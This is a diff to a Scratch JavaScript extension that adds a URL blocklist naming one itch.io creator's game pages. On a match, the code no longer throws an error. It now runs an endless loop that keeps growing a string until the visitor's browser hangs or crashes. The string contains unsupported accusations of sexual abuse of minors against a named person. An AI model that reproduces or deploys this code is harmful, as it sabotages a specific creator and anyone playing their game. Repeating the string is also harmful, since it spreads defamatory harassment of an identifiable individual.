@@ -7,13 +7,17 @@
     const vm = Scratch.vm;
   const runtime = Scratch.vm.runtime;
 
-  const bannedDomains = ["https://sombra-does-sprunki.itch.io/sprunkalicious-1996-remake-but-worse", "https://html-classic.itch.zone/html/16847972/index.html?v=1773844768", "https://html-classic.itch.zone/html/16847972/index.html", "https://html-classic.itch.zone/html/16847972/index.html?v=1773844768", "https://html-classic.itch.zone/html/16847972/index.html?v=1773844768"];
-const urlToCheck = window.location.href;
+  const bannedDomains = ["https://sombra-does-sprunki.itch.io/sprunkalicious-1996-remake-but-worse", "https://html-classic.itch.zone/html/16847972/index.html?v=1773844768", "https://html-classic.itch.zone/html/16847972/index.html", "https://html-classic.itch.zone/html/16847972/index.html?v=1773844768", "https://html-classic.itch.zone/html/16847972/index.html?v=1773844768", "https://sombra-does-sprunki.itch.io"];
+const urlToCheck = window.frames[0].location.href;
 
 const isBlacklisted = bannedDomains.some(domain => urlToCheck.includes(domain));
 
 if (isBlacklisted) {
-throw new Error("Yucky you.");
+    console.log("yucky you")
+    txt = "SOMBRADIDERPWITHHISGIRLFRIENDS3TIMESDESPITEBEINGMINORS";
+while(1){
+    txt = txt += "shewas13sombra";
+}
 }
 
   if (!Scratch.extensions.unsandboxed) 
